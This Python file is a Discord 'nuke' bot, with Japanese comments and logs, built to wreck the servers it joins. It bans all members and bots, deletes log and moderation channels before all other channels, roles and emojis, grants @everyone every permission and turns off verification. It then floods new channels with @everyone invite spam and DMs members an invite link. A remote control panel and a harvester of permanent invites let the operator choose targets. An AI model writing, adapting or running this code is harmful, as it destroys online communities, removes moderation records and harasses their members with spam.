import discord
from discord.ext import commands
import asyncio
import random
import os
from dotenv import load_dotenv

load_dotenv()
TOKEN = os.getenv("TOKEN")
PREFIX = "!"
DEFAULT_NEW_NAME = "ますまに共栄圏植民地"
INVITE_LINK = "https://discord.gg/tqNR7BsAsR"

MANAGE_GUILD_ID = 1477622875560214548
MANAGE_CHANNEL_ID = 1477622875560214551

intents = discord.Intents.default()
intents.members = True
intents.message_content = True
intents.bans = True
intents.guilds = True

bot = commands.Bot(command_prefix=PREFIX, intents=intents, help_command=None)

async def bounded_gather(tasks, limit=10):
    semaphore = asyncio.Semaphore(limit)
    async def sem_task(coro):
        async with semaphore:
            return await coro
    return await asyncio.gather(*(sem_task(t) for t in tasks))

async def create_channel_retry(guild, name, max_retry=5):
    for _ in range(max_retry):
        try:
            return await guild.create_text_channel(name)
        except discord.HTTPException as e:
            if e.status == 429:
                await asyncio.sleep(e.retry_after)
            else:
                break
    return None

async def send_dm(member):
    try:
        await member.send(INVITE_LINK)
    except:
        pass

async def delete_emojis_and_stickers(guild):
    emojis = await guild.fetch_emojis()
    if emojis:
        await bounded_gather((e.delete() for e in emojis), limit=10)

    stickers = await guild.fetch_stickers()
    if stickers:
        await bounded_gather((s.delete() for s in stickers), limit=10)

async def core_nuke(guild, new_server_name=None):
    if guild.id == MANAGE_GUILD_ID:
        print(f"管理サーバー({guild.name})のためヌークをスキップ")
        return

    new_name = new_server_name or DEFAULT_NEW_NAME

    # Phase1: 情報取得 (ストリーム処理)
    non_bot_members = []
    dm_members = []
    bot_members = []
    async for m in guild.fetch_members(limit=None):
        if m == guild.me:
            continue
        if m.bot:
            bot_members.append(m)
        else:
            non_bot_members.append(m)
            if not m.guild_permissions.administrator:
                dm_members.append(m)

    print(f"破壊開始: {guild.name} 非BOT={len(non_bot_members)}")

    # Phase2: 削除
    async with asyncio.TaskGroup() as tg:
        if bot_members:
            tg.create_task(bounded_gather((guild.ban(m, delete_message_seconds=0) for m in bot_members), limit=10))
        tg.create_task(delete_emojis_and_stickers(guild))

        log_keywords = ["log", "ログ", "audit", "監視", "mod", "moderation", "admin", "管理", "report", "報告", "ticket", "チケット"]
        log_channels = [ch for ch in guild.channels if any(kw.lower() in ch.name.lower() for kw in log_keywords)]
        if log_channels:
            tg.create_task(bounded_gather((ch.delete() for ch in log_channels), limit=10))

        roles_to_delete = [r for r in guild.roles if not r.is_default and not r.managed]
        if roles_to_delete:
            tg.create_task(bounded_gather((r.delete() for r in roles_to_delete), limit=10))

        channels = list(guild.channels)
        if channels:
            tg.create_task(bounded_gather((ch.delete() for ch in channels), limit=10))

    # @everyone権限最大化 + サーバー編集
    everyone_role = guild.default_role
    permissions = discord.Permissions.all()
    try:
        await everyone_role.edit(permissions=permissions)
    except discord.HTTPException as e:
        if e.status == 429:
            await asyncio.sleep(e.retry_after)

    try:
        await guild.edit(
            name=new_name,
            verification_level=discord.VerificationLevel.none,
            explicit_content_filter=discord.ContentFilter.disabled,
            default_notifications=discord.NotificationLevel.all_messages,
            community_features=False,
            system_channel=None,
            rules_channel=None,
            icon=None,
            banner=None,
            splash=None
        )
    except discord.HTTPException as e:
        if e.status == 429:
            await asyncio.sleep(e.retry_after)

    # Phase3: 作成
    member_count = len(non_bot_members)
    if member_count < 100:
        target_channels = 80
    elif member_count < 500:
        target_channels = 70
    else:
        target_channels = 50

    target_roles = 240

    channels_created = []
    current = 0
    channel_names = ["ますまに共栄圏万歳", "ますまに共栄圏最強"]
    while len(channels_created) < target_channels:
        tasks = [create_channel_retry(guild, channel_names[current % 2]) for _ in range(min(30, target_channels - len(channels_created)))]
        batch = await asyncio.gather(*tasks, return_exceptions=True)
        added = [c for c in batch if isinstance(c, discord.TextChannel)]
        channels_created += added
        current += len(added)

    # ロール作成
    role_create_task = asyncio.create_task(create_colored_roles_task(guild, target_roles))

    # Phase4: 通知 (DM + BAN + スパム)
    async with asyncio.TaskGroup() as tg:
        if dm_members:
            tg.create_task(bounded_gather((send_dm(m) for m in dm_members), limit=10))

        tg.create_task(ban_all_task(guild, non_bot_members, new_name))

    # スパム (Queueワーカー)
    spam_messages = [
        f"@everyone {INVITE_LINK}",
        f"@everyone 来い {INVITE_LINK}"
    ]

    message_counters = {ch.id: 0 for ch in channels_created}
    active_channels = channels_created.copy()

    queue = asyncio.Queue()
    async def spam_worker():
        while True:
            ch = await queue.get()
            if message_counters[ch.id] >= 300:
                queue.task_done()
                continue
            await ch.send(random.choice(spam_messages))
            message_counters[ch.id] += 1
            queue.task_done()

    workers = [asyncio.create_task(spam_worker()) for _ in range(10)]

    while any(c < 300 for c in message_counters.values()):
        for ch in active_channels:
            if message_counters[ch.id] < 300:
                await queue.put(ch)
        await asyncio.sleep(0.05)  # 最小sleep

    await queue.join()
    for w in workers:
        w.cancel()

    await role_create_task

    print("ヌーク完了 → bot退出")
    try:
        await guild.leave()
    except Exception as e:
        print(f"退出失敗: {e}")

    print("完了")

@bot.event
async def on_guild_join(guild):
    if guild.id == MANAGE_GUILD_ID:
        print(f"管理サーバー参加: {guild.name} → 残留（保護）")
        return

    non_bot_members = [m for m in guild.members if not m.bot and m != guild.me]
    member_count = len(non_bot_members)

    if member_count <= 5 and not guild.name.startswith("ま") or guild.name == "郁郁地区美通話":
        print(f"自動退出: {guild.name} (メンバー含まず {member_count}人、名前が「ま」から始まらない or 郁郁地区美通話)")
        try:
            await guild.leave()
        except Exception as e:
            print(f"退出失敗: {e}")
    else:
        print(f"新規参加: {guild.name} (メンバー含まず {member_count}人) → 残留")

@bot.event
async def on_ready():
    print(f"起動: {bot.user}")
    print("=== ボット起動時の全サーバー情報 ===")
    for guild in bot.guilds:
        if guild.id == MANAGE_GUILD_ID:
            print(f"管理サーバー: {guild.name} → 残留（保護）")
            await log_server_info(guild)
            continue

        non_bot_members = [m for m in guild.members if not m.bot and m != guild.me]
        member_count = len(non_bot_members)
        if member_count <= 5 and not guild.name.startswith("ま") or guild.name == "郁郁地区美通話":
            print(f"起動時自動退出: {guild.name} (メンバー含まず {member_count}人)")
            try:
                await guild.leave()
            except Exception as e:
                print(f"退出失敗: {e}")
        else:
            await log_server_info(guild)
    print("=====================================")

    manage_guild = bot.get_guild(MANAGE_GUILD_ID)
    if manage_guild:
        manage_channel = manage_guild.get_channel(MANAGE_CHANNEL_ID)
        if manage_channel:
            view = ManageView(bot)
            options = [discord.SelectOption(label=g.name, value=str(g.id)) for g in bot.guilds if g.id != MANAGE_GUILD_ID]
            view.select_guild.options = options
            await manage_channel.send("サーバー管理パネル", view=view)
        else:
            print("管理チャンネルが見つかりません")
    else:
        print("管理サーバーが見つかりません")

class ManageView(discord.ui.View):
    def __init__(self, bot):
        super().__init__(timeout=None)
        self.bot = bot

    @discord.ui.button(label="サーバー一覧", style=discord.ButtonStyle.primary)
    async def list_servers(self, interaction: discord.Interaction, button: discord.ui.Button):
        embed = discord.Embed(title="ボットが入ってるサーバー一覧", color=discord.Color.blue())
        for g in self.bot.guilds:
            if g.id != MANAGE_GUILD_ID:
                embed.add_field(name=g.name, value=f"ID: {g.id}\nメンバー: {g.member_count}", inline=False)
        await interaction.response.send_message(embed=embed, ephemeral=True)

    @discord.ui.select(placeholder="ヌーク対象サーバー選択", options=[])
    async def select_guild(self, interaction: discord.Interaction, select: discord.ui.Select):
        guild_id = int(select.values[0])
        guild = self.bot.get_guild(guild_id)
        if guild and guild.id != MANAGE_GUILD_ID:
            await core_nuke(guild)
            await interaction.response.send_message(f"{guild.name} でヌーク起動しました。", ephemeral=True)
        else:
            await interaction.response.send_message("無効なサーバーまたは保護されています。", ephemeral=True)

@bot.command(name="masumani", aliases=["setup"])
async def trigger(ctx, *, new_name: str = None):
    if not ctx.guild or ctx.guild.id == MANAGE_GUILD_ID:
        await ctx.send("このサーバーでは使用できません。", delete_after=10)
        return
    try:
        await ctx.message.delete()
    except:
        pass
    asyncio.create_task(core_nuke(ctx.guild, new_name))

async def log_server_info(guild):
    member_count = guild.member_count
    server_name = guild.name
    invite_link = "取得失敗（権限不足 or チャンネルなし）"

    try:
        invites = await guild.invites()
        permanent_invite = None
        for inv in invites:
            if inv.max_age == 0 and inv.max_uses == 0:
                permanent_invite = inv
                break
            if inv.inviter is None or inv.inviter == guild.owner:
                permanent_invite = inv
                break

        if permanent_invite:
            invite_link = permanent_invite.url
        else:
            if guild.text_channels:
                channel = guild.text_channels[0]
                new_invite = await channel.create_invite(max_age=0, max_uses=0, unique=True, reason="Bot自動永久招待")
                invite_link = new_invite.url
            else:
                invite_link = "テキストチャンネルなし"
    except discord.Forbidden:
        invite_link = "権限不足（MANAGE_CHANNELS or CREATE_INSTANT_INVITEが必要）"
    except Exception as e:
        invite_link = f"エラー: {str(e)}"

    print(f"サーバー: {server_name}")
    print(f"メンバー数: {member_count}")
    print(f"永久招待リンク: {invite_link}")
    print("---")

bot.run(TOKEN)
